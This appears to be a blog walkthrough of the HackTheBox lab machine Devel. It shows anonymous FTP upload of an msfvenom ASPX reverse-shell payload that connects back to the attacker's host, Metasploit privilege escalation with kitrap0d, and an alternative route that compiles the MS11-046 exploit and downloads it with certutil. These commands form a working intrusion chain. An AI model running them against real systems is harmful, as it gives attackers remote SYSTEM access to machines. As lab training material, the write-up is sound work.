---
title: "Walk-through of Devel from HackTheBox"
header:
  teaser: /assets/images/2020-05-14-21-10-10.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Meterpreter
  - MSFVenom
  - certutil
  - Windows
---

## Machine Information

![Devel](/assets/images/2020-05-14-21-10-10.png)

Devel is a beginner level box that demonstrates the security risks associated with some default
program configurations. It can be completed using publicly available exploits. Skills required are basic knowledge of Windows and enumerating ports and services. Skills learned are identifying vulnerable services, exploiting weak credentials and basic Windows privilege escalation techniques.

<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu/) |
| Link To Machine | [HTB - 003 - Easy - Devel](https://www.hackthebox.eu/home/machines/profile/3) |
| Machine Release Date | 15th March 2017 |
| Date I Completed It | 23th July 2019 |
| Distribution used | Kali 2019.1 – [Release Info](https://www.kali.org/news/kali-linux-2019-1-release/) |

## Method Using Meterpreter

### Initial Recon

Check for open ports with Nmap:

```text
root@kali:~/htb/devel# nmap -sC -sV -oA devel 10.10.10.5

Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-23 11:38 BST
Nmap scan report for 10.10.10.5
Host is up (0.044s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 07-26-19  04:28PM                    6 caca.txt
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Only two ports open, nmap identifies anonymous FTP, so try logging in:

```text
root@kali:~/htb/devel# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
```

Logged in to FTP server, only file there is **iisstart.htm**.

Browse to website on port 80, shows same default iisstart page with welcome logo. So looks like web root is same location as ftp. Test it by creating a file and uploading to server:

```text
root@kali:~/htb/devel# echo spen > test.html
ftp> put test.html
local: test.html remote: test.html
```

Now try opening the file in the browser:

![website](/assets/images/2020-05-13-21-22-17.png)

Works, so we can open html files placed in the ftp server.

Check what version of IIS is running on the webserver using Burp Repeater:

![burp](/assets/images/2020-05-13-21-28-32.png)

Burp shows it has IIS 7.5 which is Server 2008R2 or Windows 7.

### Gaining Access

Use msfvenom to create a payload:

```text
root@kali:~/htb/devel# msfvenom -l all | grep windows | grep meterpreter | grep reverse_tcp

windows/meterpreter/reverse_tcp     Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker

root@kali:~/htb/devel# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f aspx -o spen.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2804 bytes
Saved as: spen.aspx
```

Copy the payload to the FTP server:

```text
ftp> put spen.aspx
local: spen.aspx remote: spen.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2840 bytes sent in 0.00 secs (17.3618 MB/s)
```

Switch back to browser and open the spen.aspx file we just uploaded. The start msfconsole with handler listening:

```text
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.14.22
LHOST => tun0
msf5 exploit(multi/handler) > options
Module options (exploit/multi/handler):
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   EXITFUNC  process          yes             Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes             The listen address (an interface may be specified)
   LPORT     4444             yes             The listen port
Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target

msf5 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.22:4444
[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.22:4444 -> 10.10.10.5:49157) at 2019-07-23 12:48:40 +0100

meterpreter > sessions -i 1
Usage: sessions <id>
Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows

meterpreter > shell
Process 3868 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
c:\windows\system32\inetsrv>systeminfo
systeminfo
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31
System Boot Time:          26/7/2019, 10:37:35
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 28/7/2017
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 698 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.542 MB
Virtual Memory: In Use:    505 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
```

So this is a Windows 7 box with no hotfixes. Exit out of shell and put session in background:

```text
c:\windows\system32\inetsrv>exit
exit
meterpreter > background
[*] Backgrounding session 1...
```

Use search to find the exploit suggester:

```text
msf5 exploit(multi/handler) > search suggest

Matching Modules
================
   #  Name                                             Disclosure Date  Rank    Check  Description
   -  ----                                             ---------------  ----    -----  -----------
   0  auxiliary/server/icmp_exfil                                       normal  No     ICMP Exfiltration Service
   1  exploit/windows/browser/ms10_018_ie_behaviors    2010-03-09       good    No     MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free
   2  exploit/windows/smb/timbuktu_plughntcommand_bof  2009-06-25       great   No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
   3  post/multi/recon/local_exploit_suggester                          normal  No     Multi Recon Local Exploit Suggester
   4  post/osx/gather/enum_colloquy                                     normal  No     OS X Gather Colloquy Enumeration

msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > options
Module options (post/multi/recon/local_exploit_suggester): 
   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
msf5 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf5 post(multi/recon/local_exploit_suggester) > options
Module options (post/multi/recon/local_exploit_suggester): 
   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
msf5 post(multi/recon/local_exploit_suggester) > run
[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 29 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

Found lots of potential exploits to try:

```text
msf5 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
msf5 exploit(windows/local/ms10_015_kitrap0d) > options
Module options (exploit/windows/local/ms10_015_kitrap0d):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.
Exploit target:
   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)
msf5 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
SESSION => 1
```

Using **set SESSION 1** lets the exploit uses the already open session to box. Now we can run it:

```text
msf5 exploit(windows/local/ms10_015_kitrap0d) > exploit 
[*] Started reverse TCP handler on 192.168.0.11:4444 
[*] Launching notepad to host the exploit...
[+] Process 3324 launched.
[*] Reflectively injecting the exploit DLL into 3324...
[*] Injecting exploit into 3324 …
[*] Exploit injected. Injecting payload into 3324...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Exploit completed, but no session was created.
```

First time you run exploit it has wrong IP, not sure how to change before, but can do it now:

```text
msf5 exploit(windows/local/ms10_015_kitrap0d) > options
Module options (exploit/windows/local/ms10_015_kitrap0d):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.11     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)
msf5 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 10.10.14.22
LHOST=> 10.10.14.22
msf5 exploit(windows/local/ms10_015_kitrap0d) > exploit
[*] Started reverse TCP handler on 10.10.14.22:4444 
[*] Launching notepad to host the exploit...
[+] Process 2988 launched.
[*] Reflectively injecting the exploit DLL into 2988...
[*] Injecting exploit into 2988 …
[*] Exploit injected. Injecting payload into 2988...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.22:4444 -> 10.10.10.5:49160) at 2019-07-23 13:21:54 +0100
```

### User and Root Flags

Session established using exploit, now get a root shell:

```text
meterpreter > shell
Process 3532 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
c:\windows\system32\inetsrv>whoami
whoami
nt authority\system
```

Can now get flags:

```text
c:\>type c:\users\babis\desktop\user.txt.txt
c:\>type c:\users\administrator\desktop\root.txt.txt
```

## Alternative Method (without Meterpreter)

Brief notes on a different way to complete the box.

Create payload as before using MSFVenom:

```text
root@kali:~/htb/devel# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f aspx -o spen2.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2719 bytes
Saved as: spen2.aspx
```

Start an nc session listening on another terminal:

```text
root@kali:~/htb/devel# nc -lvp 4444
listening on [any] 4444 …
```

Go to website and open spen2.aspx file, now back to nc terminal and should have connection:

```text
10.10.10.5: inverse host lookup failed: Unknown host
connect to [10.10.14.22] from (UNKNOWN) [10.10.10.5] 49161
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 c:\windows\system32\inetsrv>
```

Checking for exploits for this version of Windows I find [this](https://www.exploit-db.com/exploits/40564). Look on searchsploit for it:

```text
root@kali:~/htb/devel# searchsploit 40564
------------------------------------ ----------------------------------------
Exploit Title |  Path | (/usr/share/exploitdb/)
------------------------------------ ----------------------------------------
Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
| exploits/windows_x86/local/40564.c
------------------------------------ ----------------------------------------
```

Mirror to local and look how to compile:

```text
root@kali:~/htb/devel# searchsploit -m 40564
  Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
      URL: https://www.exploit-db.com/exploits/40564
     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
File Type: C source, ASCII text, with CRLF line terminators 
Copied to: /root/htb/machines/devel/40564.c

root@kali:~/htb/devel# cat 40564.c | grep compiling -A 1
#   Exploit compiling (Kali GNU/Linux Rolling 64-bit):
#     - # i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
```

Need to install mingw so I can compile it:

```text
root@kali:~/htb/devel# apt-get install mingw-w64
root@kali:~/htb/devel# i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
```

Start a webserver so I can get file from box:

```text
root@kali:~/htb/devel# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 …
```

Switch back to shell on box, use certutil to get the file and execute it:

```text
cd c:\Users\Public\Downloads
c:\Users\Public\Downloads> certutil -urlcache -f http://10.10.14.22/MS11-046.exe spen.exe
certutil -urlcache -f http://10.10.14.22/MS11-046.exe spen.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Now check which user we are currently:

```text
c:\Users\Public\Downloads>whoami
iis apppool\web
```

Run exploit and check again:

```text
c:\Users\Public\Downloads>spen.exe
c:\Windows\System32>whoami
whoami
nt authority\system
```

I can now get the user and root flags, from the paths the same as above.
